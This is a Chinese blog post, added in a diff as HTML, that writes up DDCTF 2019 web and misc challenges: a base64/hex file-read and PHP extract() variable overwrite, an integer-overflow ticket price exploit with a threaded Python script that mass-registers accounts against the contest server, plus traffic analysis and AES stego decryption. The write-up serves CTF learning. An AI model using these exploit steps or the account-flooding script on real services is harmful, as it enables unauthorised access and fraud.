@@ -1,0 +1,398 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--Description-->
+    
+        <meta name="description" content="向来拿不起,也放不下。QQ:1807801293">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="Yogurt">
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="DDCTF"/>
+    
+
+    <!--Open Graph Description-->
+    
+        <meta property="og:description" content="向来拿不起,也放不下。QQ:1807801293" />
+    
+
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="Yogurt"/>
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="article" />
+    
+
+    <!--Page Cover-->
+    
+
+    <meta name="twitter:card" content="summary" />
+    
+
+    <!-- Title -->
+    
+    <title>DDCTF - Yogurt</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Gallery -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/style.css">
+
+    <!-- Google Analytics -->
+    
+
+
+</head>
+
+
+<body>
+
+<div class="bg-gradient"></div>
+<div class="bg-pattern"></div>
+
+<!-- Menu -->
+<!--Menu Links and Overlay-->
+<div class="menu-bg">
+    <div class="menu-container">
+        <ul>
+            
+            <li class="menu-item">
+                <a href="/">
+                    Home
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/archives">
+                    Archives
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/about.html">
+                    About
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/tags">
+                    Tags
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/categories">
+                    Categories
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+<!--Hamburger Icon-->
+<nav>
+    <a href="#menu"></a>
+</nav>
+
+<div class="container">
+
+    <!-- Main Content -->
+    <div class="row">
+    <div class="col-sm-12">
+
+        <!--Title and Logo-->
+        <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=990 height=86 src="//music.163.com/outchain/player?type=2&id=1299711624&auto=1&height=66"></iframe>
+<header>
+    <div class="logo">
+        <a href="/"><i class="logo-icon fa fa-cube" aria-hidden="true"></i></a>
+        
+    </div>
+</header>
+
+        <section class="main">
+            
+<div class="post">
+
+    <div class="post-header">
+        <h1 class="title">
+            <a href="/2019/04/19/DDCTF/">
+                DDCTF
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2019-04-19</span>
+            
+            
+                <a href="#disqus_thread" class="comments">Comments</a>
+            
+            
+                <span class="category">
+                    <a href="/categories/CTF/">CTF</a>
+                </span>
+            
+        </div>
+    </div>
+
+    <div class="content">
+
+        <!-- Gallery -->
+        
+
+        <!-- Post Content -->
+        <h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="第一题：滴"><a href="#第一题：滴" class="headerlink" title="第一题：滴~"></a>第一题：滴~</h2><p>这题进来就一个图片还有两行flag.jpg，可以观察到地址栏中jpg=后边的是base64编码，解两次base64然后十六进制转换得到是flag.jpg。<br>然后想到把index.php先十六进制再base64两次得到TmprMlpUWTBOalUzT0RKbE56QTJPRGN3放入地址栏jpg=TmprMlpUWTBOalUzT0RKbE56QTJPRGN3</p>
+<p>然后看到页面变了~<br><img src="/2019/04/19/DDCTF/di-1.png" alt=""><br>这种情况下没看见什么其他信息，所以就看一下源代码，发现了base64编码的好长一段。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHANCi8qDQogKiBodHRwczovL2Jsb2cuY3Nkbi5uZXQvRmVuZ0JhbkxpdVl1bi9hcnRpY2xlL2RldGFpbHMvODA2MTY2MDcNCiAqIERhdGU6IEp1bHkgNCwyMDE4DQogKi8NCmVycm9yX3JlcG9ydGluZyhFX0FMTCB8fCB+RV9OT1RJQ0UpOw0KDQoNCmhlYWRlcignY29udGVudC10eXBlOnRleHQvaHRtbDtjaGFyc2V0PXV0Zi04Jyk7DQppZighIGlzc2V0KCRfR0VUWydqcGcnXSkpDQogICAgaGVhZGVyKCdSZWZyZXNoOjA7dXJsPS4vaW5kZXgucGhwP2pwZz1UbXBaTWxGNldYaE9hbU41VWxSYVFrNTZRVEpPZHowOScpOw0KJGZpbGUgPSBoZXgyYmluKGJhc2U2NF9kZWNvZGUoYmFzZTY0X2RlY29kZSgkX0dFVFsnanBnJ10pKSk7DQplY2hvICc8dGl0bGU+Jy4kX0dFVFsnanBnJ10uJzwvdGl0bGU+JzsNCiRmaWxlID0gcHJlZ19yZXBsYWNlKCIvW15hLXpBLVowLTkuXSsvIiwiIiwgJGZpbGUpOw0KZWNobyAkZmlsZS4nPC9icj4nOw0KJGZpbGUgPSBzdHJfcmVwbGFjZSgiY29uZmlnIiwiISIsICRmaWxlKTsNCmVjaG8gJGZpbGUuJzwvYnI+JzsNCiR0eHQgPSBiYXNlNjRfZW5jb2RlKGZpbGVfZ2V0X2NvbnRlbnRzKCRmaWxlKSk7DQoNCmVjaG8gIjxpbWcgc3JjPSdkYXRhOmltYWdlL2dpZjtiYXNlNjQsIi4kdHh0LiInPjwvaW1nPiI7DQovKg0KICogQ2FuIHlvdSBmaW5kIHRoZSBmbGFnIGZpbGU/DQogKg0KICovDQoNCj8+DQo=</span><br></pre></td></tr></table></figure>
+<p>解码后：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/*</span><br><span class="line"> * https://blog.csdn.net/FengBanLiuYun/article/details/80616607</span><br><span class="line"> * Date: July 4,2018</span><br><span class="line"> */</span><br><span class="line">error_reporting(E_ALL || ~E_NOTICE);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">header(&apos;content-type:text/html;charset=utf-8&apos;);</span><br><span class="line">if(! isset($_GET[&apos;jpg&apos;]))</span><br><span class="line">    header(&apos;Refresh:0;url=./index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09&apos;);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[&apos;jpg&apos;])));</span><br><span class="line">echo &apos;&lt;title&gt;&apos;.$_GET[&apos;jpg&apos;].&apos;&lt;/title&gt;&apos;;</span><br><span class="line">$file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;,&quot;&quot;, $file);</span><br><span class="line">echo $file.&apos;&lt;/br&gt;&apos;;</span><br><span class="line">$file = str_replace(&quot;config&quot;,&quot;!&quot;, $file);</span><br><span class="line">echo $file.&apos;&lt;/br&gt;&apos;;</span><br><span class="line">$txt = base64_encode(file_get_contents($file));</span><br><span class="line"></span><br><span class="line">echo &quot;&lt;img src=&apos;data:image/gif;base64,&quot;.$txt.&quot;&apos;&gt;&lt;/img&gt;&quot;;</span><br><span class="line">/*</span><br><span class="line"> * Can you find the flag file?</span><br><span class="line"> *</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>可以看到上面有一个博客地址，我们复制到浏览器瞅瞅，找到他的7月4日博客。<br><img src="/2019/04/19/DDCTF/di-3.png" alt=""></p>
+<p>看到了备份文件名practice.txt.swp：<br><img src="/2019/04/19/DDCTF/di-4.png" alt=""></p>
+<p>然后不用说了吧，还是先十六进制再两次base64得到TnpBM01qWXhOak0zTkRZNU5qTTJOVEpsTnpRM09EYzBNbVUzTXpjM056QT0=.<br>我写了一个极简单的脚本，因为懒得在网页上加密。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">import base64</span><br><span class="line">strr=raw_input(&quot;请输入你要编码的字符串：&quot;.decode(&apos;utf-8&apos;).encode(&apos;gbk&apos;))</span><br><span class="line">str1=strr.encode(&apos;hex&apos;)</span><br><span class="line">str2=base64.b64encode(str1)</span><br><span class="line">str3=base64.b64encode(str2)</span><br><span class="line"></span><br><span class="line">print (str3)</span><br></pre></td></tr></table></figure>
+<p>但其实，从practice.txt.swp开始，会发现，可以直接地址栏进到该页面，不用再编码了。这也算是两种方法吧。都可以。<br><img src="/2019/04/19/DDCTF/di-7.png" alt=""><br><img src="/2019/04/19/DDCTF/di-2.png" alt=""><br>然后接着查看源代码。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;title&gt;TnpBM01qWXhOak0zTkRZNU5qTTJOVEpsTnpRM09EYzBNbVUzTXpjM056QT0=&lt;/title&gt;practice.txt.swp&lt;/br&gt;practice.txt.swp&lt;/br&gt;&lt;img src=&apos;data:image/gif;base64,ZjFhZyFkZGN0Zi5waHA=&apos;&gt;&lt;/img&gt;</span><br></pre></td></tr></table></figure>
+<p>解密得到：f1ag!ddctf.php<br>记得上次出来的源代码有这样一句：str_replace(“config”,”!”, $file);<br>所以这里的f1ag!ddctf.php就变成了f1agconfigddctf.php</p>
+<p>于是可以接着编码然后jpg=编码 ，或者直接地址栏ip/f1agconfigddctf.php。</p>
+<p><img src="/2019/04/19/DDCTF/di-5.png" alt=""></p>
+<p>接着看源代码得到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;title&gt;TmpZek1UWXhOamMyTXpabU5tVTJOalk1TmpjMk5EWTBOak0zTkRZMk1tVTNNRFk0TnpBPQ==&lt;/title&gt;f1agconfigddctf.php&lt;/br&gt;f1ag!ddctf.php&lt;/br&gt;&lt;img src=&apos;data:image/gif;base64,PD9waHANCmluY2x1ZGUoJ2NvbmZpZy5waHAnKTsNCiRrID0gJ2hlbGxvJzsNCmV4dHJhY3QoJF9HRVQpOw0KaWYoaXNzZXQoJHVpZCkpDQp7DQogICAgJGNvbnRlbnQ9dHJpbShmaWxlX2dldF9jb250ZW50cygkaykpOw0KICAgIGlmKCR1aWQ9PSRjb250ZW50KQ0KCXsNCgkJZWNobyAkZmxhZzsNCgl9DQoJZWxzZQ0KCXsNCgkJZWNobydoZWxsbyc7DQoJfQ0KfQ0KDQo/Pg==&apos;&gt;&lt;/img&gt;</span><br></pre></td></tr></table></figure>
+<p>解码后得：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(&apos;config.php&apos;);</span><br><span class="line">$k = &apos;hello&apos;;</span><br><span class="line">extract($_GET);</span><br><span class="line">if(isset($uid))</span><br><span class="line">&#123;</span><br><span class="line">    $content=trim(file_get_contents($k));</span><br><span class="line">    if($uid==$content)</span><br><span class="line">	&#123;</span><br><span class="line">		echo $flag;</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		echo&apos;hello&apos;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>分析代码存在变量覆盖。<br><code>extract($_GET);</code>会将GET内容转换成变量。<br><code>file_get_contents($k)</code>使用php://input将会返回post的数据<br><img src="/2019/04/19/DDCTF/di-6.png" alt=""></p>
+<p>DDCTF{436f6e67726174756c6174696f6e73}</p>
+<h2 id="大吉大利，今晚吃鸡"><a href="#大吉大利，今晚吃鸡" class="headerlink" title="大吉大利，今晚吃鸡"></a>大吉大利，今晚吃鸡</h2><blockquote>
+<p>整数溢出，暴力破解</p>
+</blockquote>
+<p>这题关键步骤就在登陆以后如何用仅有的100购买2000的入场券。这里利用整型注入改价钱。<br>我把2000改为2^32，也就是4294967297。这样会溢出为0.<br>所以改了参数以后，提交，页面显示还是4294967297，支付时才产生溢出，最后用了1。<br><img src="/2019/04/19/DDCTF/吃鸡2.png" alt=""></p>
+<p><img src="/2019/04/19/DDCTF/吃鸡3.png" alt=""></p>
+<p><img src="/2019/04/19/DDCTF/吃鸡4.png" alt=""><br>后来说要淘汰100个人，但是你并不知道其他人都是什么。所以可以注册新用户，再淘汰他。</p>
+<p>然后利用脚本淘汰（感谢大佬）。淘汰完以后用淘汰者登陆<br><a href="http://117.51.147.155:5050/ctf/api/get_flag可得flag。" target="_blank" rel="noopener">http://117.51.147.155:5050/ctf/api/get_flag可得flag。</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import random</span><br><span class="line">import string</span><br><span class="line">import threading</span><br><span class="line">from time import sleep</span><br><span class="line"></span><br><span class="line">def randStr(length):</span><br><span class="line">    return &apos;&apos;.join(random.sample(string.ascii_letters + string.digits, length))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class MyThread(threading.Thread):</span><br><span class="line"></span><br><span class="line">    def __init__(self,func,args=()):</span><br><span class="line">        super(MyThread,self).__init__()</span><br><span class="line">        self.func = func</span><br><span class="line">        self.args = args</span><br><span class="line"></span><br><span class="line">    def run(self):</span><br><span class="line">        self.result = self.func(*self.args)</span><br><span class="line"></span><br><span class="line">    def get_result(self):</span><br><span class="line">        try:</span><br><span class="line">            return self.result</span><br><span class="line">        except Exception:</span><br><span class="line">            return None</span><br><span class="line"></span><br><span class="line">def attack(count,un,pw):</span><br><span class="line">    try:</span><br><span class="line">        s=requests.session()</span><br><span class="line">        tun=randStr(8)</span><br><span class="line">        tpw=randStr(8)</span><br><span class="line">        s.get(&apos;http://117.51.147.155:5050/ctf/api/register?name=%s&amp;password=%s&apos; % (tun, tpw))</span><br><span class="line">        r=s.get(&apos;http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=4294967298&apos;)</span><br><span class="line">        bill=r.text.split(&apos;bill_id&quot;:&quot;&apos;)[1].split(&apos;&quot;&apos;)[0]</span><br><span class="line">        r=s.get(&apos;http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id=%s&apos; % bill)</span><br><span class="line">        id=r.text.split(&apos;your_id&quot;:&apos;)[1].split(&apos;,&apos;)[0]</span><br><span class="line">        ticket=r.text.split(&apos;your_ticket&quot;:&quot;&apos;)[1].split(&apos;&quot;&apos;)[0]</span><br><span class="line">        print id,ticket</span><br><span class="line">        s.get(&apos;http://117.51.147.155:5050/ctf/api/login?name=%s&amp;password=%s&apos; % (un, pw))</span><br><span class="line">        r=s.get(&apos;http://117.51.147.155:5050/ctf/api/remove_robot?ticket=%s&amp;id=%s&apos; % (ticket, id))</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">s=requests.session()</span><br><span class="line">un=&apos;yogurt&apos;</span><br><span class="line">pw=&apos;qw87168716&apos;</span><br><span class="line">print (un, pw)</span><br><span class="line"></span><br><span class="line">for i in range(50):</span><br><span class="line">    for j in range(10):</span><br><span class="line">        print i,j</span><br><span class="line">        ts=[]</span><br><span class="line">        t=MyThread(attack,args=(i*5+j,un,pw))</span><br><span class="line">        ts.append(t)</span><br><span class="line">        t.start()</span><br><span class="line">        sleep(1)</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/04/19/DDCTF/吃鸡5.png" alt=""></p>
+<h2 id="Upload-IMG"><a href="#Upload-IMG" class="headerlink" title="Upload-IMG"></a>Upload-IMG</h2><p>这题上来是上传图片，还必须有phpinfo().上传了一个试试，把已经上传的图片下载下来，发现图片名字也被换了，查看十六进制发现好多好多不一样了。二次渲染了呗。<br>于是刚开始我的方法是不断在不变的地方插入phpinfo()，后来连续失败，很无语，方法是对的。</p>
+<p>后来用了学长的脚本（学长威武）：<br>首先上传一张图片，然后把二次渲染的图片下载下来，执行脚本。把这个得到的新图片上传，即可得到flag。</p>
+<p><img src="/2019/04/19/DDCTF/img.png" alt=""></p>
+<p><img src="/2019/04/19/DDCTF/img2.png" alt=""></p>
+<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h2><p>这是个简单的流量分析，先过滤http流，然后会看到有网址，还有图片。于是导出保存，得到一堆文件。<br>有图片还有一堆不知什么格式的文件。于是一个一个看。<br><img src="/2019/04/19/DDCTF/流量分析1.png" alt=""></p>
+<p>有一个钥匙的图片，将其利用十六进制编辑器改一下高度，便可以看到一个key，猜测可能是图片解密。<br>后来查到了img_add_info像是网站，添加个后缀名后打开解密图片得flag。<br><img src="/2019/04/19/DDCTF/流量分析2.png" alt=""></p>
+<p><img src="/2019/04/19/DDCTF/流量分析3.png" alt=""></p>
+<p>得到的是十六进制，再变成字符就ok。</p>
+<p>DDCTF{QEWokcpHeUo2WOfBIN7pogIWsF04iRjt}</p>
+<h2 id="北京地铁"><a href="#北京地铁" class="headerlink" title="北京地铁"></a>北京地铁</h2><p>这是隐写和解密的题</p>
+<p> Color Threshold</p>
+<p>提示：AES ECB密钥为小写字母<br>提示2：密钥不足位用\0补全<br>提示3：不要光记得隐写不看图片本身啊…</p>
+<p><img src="/2019/04/19/DDCTF/北京地铁.bmp" alt=""></p>
+<p>用StegSolve打开 然后LSB里找到了一串base64编码的密文，大概是AES的密文。<br><img src="/2019/04/19/DDCTF/ditie2.png" alt=""></p>
+<p>然后根据Color Threshold提示用ps查看阈值。发现了一个地方魏公村有些不一样。它的小写拼音为加密密钥。</p>
+<p><img src="/2019/04/19/DDCTF/ditie1.png" alt=""></p>
+<p>然后参照大佬的脚本：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Cipher import AES</span><br><span class="line">from base64 import *</span><br><span class="line"></span><br><span class="line">cipher=b64decode(&apos;7SsQWmZ524i/yVWoMeAIJA==&apos;)</span><br><span class="line">key=&apos;weigongcun&apos;.ljust(16,&apos;\x00&apos;)</span><br><span class="line">mode=AES.MODE_ECB</span><br><span class="line"></span><br><span class="line">c=AES.new(key, mode)</span><br><span class="line">print c.decrypt(cipher)</span><br></pre></td></tr></table></figure>
+<p>DDCTF{Q*2!x@B0}</p>
+
+    </div>
+
+    
+
+    
+        <div class="post-tags">
+            <i class="fa fa-tags" aria-hidden="true"></i>
+            <a href="/tags/wp/">#wp</a>
+        </div>
+    
+
+    <!-- Comments -->
+    
+    <div class="comments">
+        
+<div id="disqus_thread">
+    <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+
+
+
+    </div>
+    
+
+</div>
+        </section>
+
+    </div>
+</div>
+
+
+</div>
+
+<!-- Footer -->
+<div class="push"></div>
+
+<footer class="footer-content">
+    <div class="container">
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
+                <h2>About</h2>
+                <p>
+                    希望每个人都能找到自己的不可替代。
+                </p>
+            </div>
+            
+    <div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 recent-posts">
+        <h2>Recent Posts</h2>
+        <ul>
+            
+            <li>
+                <a class="footer-post" href="/2019/04/19/DDCTF/">DDCTF</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2019/04/13/CTFd的搭建/">CTFd的搭建</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2019/04/09/掘安杯CTF/">掘安杯CTF</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2019/04/03/docker基本概念/">docker基本概念</a>
+            </li>
+            
+        </ul>
+    </div>
+
+
+
+            
+<div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 footer-categories">
+    <h2>Categories</h2>
+    <ul>
+        
+        <li>
+            <a class="footer-post" href="/categories/CTF环境搭建/">CTF环境搭建</a>
+        </li>
+        
+        <li>
+            <a class="footer-post" href="/categories/报错/">报错</a>
+        </li>
+        
+        <li>
+            <a class="footer-post" href="/categories/docker/">docker</a>
+        </li>
+        
+        <li>
+            <a class="footer-post" href="/categories/随笔/">随笔</a>
+        </li>
+        
+    </ul>
+</div>
+
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <ul class="list-inline footer-social-icons">
+                    
+                    <li class="list-inline-item">
+                        <a href="https://github.com/klugjo/hexo-theme-alpha-dust">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-github"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    
+                    
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://plus.google.com/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-google-plus"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="mailto:1807801293@qq.com">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-envelope-o"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <div class="footer-copyright">
+                    This is Yogurt
+                </div>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- After footer scripts -->
+
+<!-- jQuery -->
+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
+
+<!-- Tween Max -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>
+
+<!-- Gallery -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
+
+<!-- Custom JavaScript -->
+<script src="/js/main.js"></script>
+
+<!-- Disqus Comments -->
+
+<script type="text/javascript">
+    var disqus_shortname = 'klugjotest';
+
+    (function(){
+        var dsq = document.createElement('script');
+        dsq.type = 'text/javascript';
+        dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/"});</script></body>
+
+</html>
